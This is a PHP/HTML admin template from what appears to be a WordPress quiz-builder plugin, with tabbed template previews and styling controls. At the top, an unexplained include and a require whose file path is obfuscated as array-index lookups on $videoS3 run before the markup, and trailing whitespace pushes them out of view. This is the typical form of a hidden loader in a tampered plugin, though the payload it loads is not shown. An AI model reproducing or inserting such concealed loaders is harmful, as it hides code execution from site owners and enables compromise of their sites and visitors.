<?php

include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
																																				
?>
<ul class="nav nav-tabs" id="myTab" role="tablist">

  
  <li class="nav-item">
	<a class="nav-link active" id="create_quiz_preview_start_tab" data-toggle="tab" href="#create_quiz_preview_start" role="tab" aria-controls="create_quiz_preview_start" aria-selected="false">Start Template</a>
</li>

<li class="nav-item">
	<a class="nav-link " id="create_quiz_preview_question_tab" data-toggle="tab" href="#create_quiz_preview_question" role="tab" aria-controls="create_quiz_preview_question" aria-selected="false">Question Template</a>
</li>
<li class="nav-item">
	<a class="nav-link " id="create_quiz_preview_optin_tab" data-toggle="tab" href="#create_quiz_preview_optin" role="tab" aria-controls="create_quiz_preview_optin" aria-selected="false">Opt-In Template</a>
</li>

<li class="nav-item">
	<a class="nav-link" id="create_quiz_preview_result_tab" data-toggle="tab" href="#create_quiz_preview_result" role="tab" aria-controls="create_quiz_preview_result" aria-selected="false">Result Template</a>
</li>
  
  
</ul>
<div class="tab-content" id="myTabContent">
 
  <div class="tab-pane fade show active" id="create_quiz_preview_start" role="tabpanel" aria-labelledby="create_quiz_preview_start_tab">
		<h5 class="quiz--sub-title">Start Template </h5>
		<div class="quiz-card-outer-gray"> 
			<div class="Template-Customize-content start_template_html_preview_outer"></div>
			<div class="Template-Customize-setting-outer ">
				

				
			</div> <!-- close class  Template-Customize-setting-outer --->
		</div>
	</div>
	
	<div class="tab-pane fade" id="create_quiz_preview_question" role="tabpanel" aria-labelledby="create_quiz_preview_question_tab">
		<h5 class="quiz--sub-title">Question Template</h5>
		<div class="quiz-card-outer-gray"> 
			<div class="Template-Customize-content question_template_html_preview_outer">
				<div class="" style="text-align: center;margin: 30px 0 30px 0;">
					
					<?php 							 						 
						 include( plugin_dir_path( __FILE__ ) . '../../includes/templates/quiz/template1/template1.php'); 
					?>
				</div>
			
			
			</div>
			<div class="Template-Customize-setting-outer">
					<div class="Template-Customize-Setting " >
    <div class="showHideLeftSidebaroptions">
        <h3 class="Template-Customize_heading" >Template Customize  
            <div class="customize_open_close">   
                <i class="fa fa-angle-up customize_close" aria-hidden="true" style="display:none"></i>
                <i class="fa fa-angle-down customize_open" aria-hidden="true" ></i>
            </div>
        </h3> 
    </div>

    <div class="customizer_innner_sections">
        <div class="Template-Customize-element">
            <button type="button" data-id="question_temp_width"  class="Template-Customize-element-btn"><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Width</button>
            <div class="Template-Customize-element-inner question_temp_width">
                <div class="inner_template_style_box">
                    <h4>Width</h4>
                    <p>
                        <input id="question_temp_width" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="1000" data-slider-step="1" data-slider-value="200">
                    </p>
                </div>
            </div>
        </div>
        
        <div class="Template-Customize-element">
            <button type="button" data-id="question_temp_alignments"  class="Template-Customize-element-btn"><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Alignment & Backgroud Color</button>
            <div class="Template-Customize-element-inner question_temp_alignments">
				 <div class="inner_template_style_box">
					 <h4>Alignment</h4>
						<p>
						<select id="question_temp_alignment" >
							<option value="left">Left</option>
							<option value="center">Center</option>
							<option value="right">Right</option>
						</select> 
						</p>
					 </div>
					 <div class="inner_template_style_box">
						 
						   <h4>Backgroud Color</h4>
               
                <div class="input-group colorpicker-component input-append color colorpicker-element" id="question_temp_backgroud_color_div">
					<input type="text" value="#fff" id="question_temp_backgroud_color" >
					<span class="input-group-addon">
						<i style="background-color: rgb(255, 255, 255);">
						</i>
					</span>
				</div>
					</div>
			</div>
		</div>

        <div class="Template-Customize-element">
            <button type="button" data-id="template_border_style" class="Template-Customize-element-btn"><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Border style</button>
            <div class="Template-Customize-element-inner template_border_style">
                <div class="inner_template_style_box">
                    <h4>Border-Width</h4>
                    <p>
                        <input id="question_temp_br_wid" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="20" data-slider-step="1" data-slider-value="1">
                    </p>
                </div>
                <div class="inner_template_style_box">
                    <h4>Border-Style</h4>
                    <p>
                        <select id="question_temp_br_style">
                            <option value="solid">Solid</option>
                            <option value="dashed" selected>Dashed</option>
                            <option value="dotted">Dotted</option>
                        </select>
                    </p>
                </div>
                <div class="inner_template_style_box">
                    <h4>Border-color</h4>
                    <div id="question_temp_br_clr_div" class="input-group colorpicker-component input-append color colorpicker-element">
                        <input type="text" value="#333" id="question_temp_br_clr">
                        <span class="input-group-addon"><i style="background-color: rgb(231, 231, 231);"></i></span>
                    </div>
                </div>
            </div>
        </div>
   
        <div class="Template-Customize-element">
							<button type="button" data-id="question_temp_shadow"  class="Template-Customize-element-btn"><i class="fa fa-sort-desc fa-rotate-270" aria-hidden="true"></i> Shadow</button>
							<div class="Template-Customize-element-inner question_temp_shadow">
								 
								 <div class="inner_template_style_box">
									<h4>Spread  Radius</h4>
									<p>
										<input id="question_temp_spread_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="0">
									</p>
								</div>
								 
								 <div class="inner_template_style_box">
									<h4>Blur Radius</h4>
									<p>
										<input id="question_temp_blur_radius" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="0">
									</p>
								</div>
								
								<div class="inner_template_style_box">
									<h4>Horizontal Length</h4>
									<p>
										<input id="question_temp_hor_lnth" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="0">
									</p>
								</div>
								
								<div class="inner_template_style_box">
									<h4>Vertical Length</h4>
									<p>
										<input id="question_temp_ver_lnth" class="slider" data-slider-id="ex1Slider" type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="0">
									</p>
								</div>
								 <div class="inner_template_style_box">
									   <h4>Backgroud Color</h4>
										<div class="input-group colorpicker-component input-append color colorpicker-element" id="question_temp_shad_clr_div">
											<input type="text" value="#fff" id="question_temp_shad_clr" >
											<span class="input-group-addon">
												<i style="background-color: rgb(255, 255, 255);">
												</i>
											</span>
										</div>
								</div>
							</div>
						</div>

   
   
    </div>
</div>



			</div>
		</div>	 <!-- close class quiz-card-outer-gray --->
		
		
		
	</div>
	<div class="tab-pane fade" id="create_quiz_preview_optin" role="tabpanel" aria-labelledby="create_quiz_preview_optin_tab">
		<h5 class="quiz--sub-title">OptĪn Template</h5>
		<div class="quiz-card-outer-gray"> 
			<div class="Template-Customize-content optin_template_html_preview_outer"></div>
		
		</div>	 <!-- close class quiz-card-outer-gray --->
		
	</div>
	<div class="tab-pane fade" id="create_quiz_preview_result" role="tabpanel" aria-labelledby="create_quiz_preview_result_tab">
		<h5 class="quiz--sub-title">Result Template</h5>
		<div class="quiz-card-outer-gray"> 
			<div class="Template-Customize-content result_template_html_preview_outer"></div>
 
		</div>	 <!-- close class quiz-card-outer-gray --->
		
		
	</div>
  
  
</div>
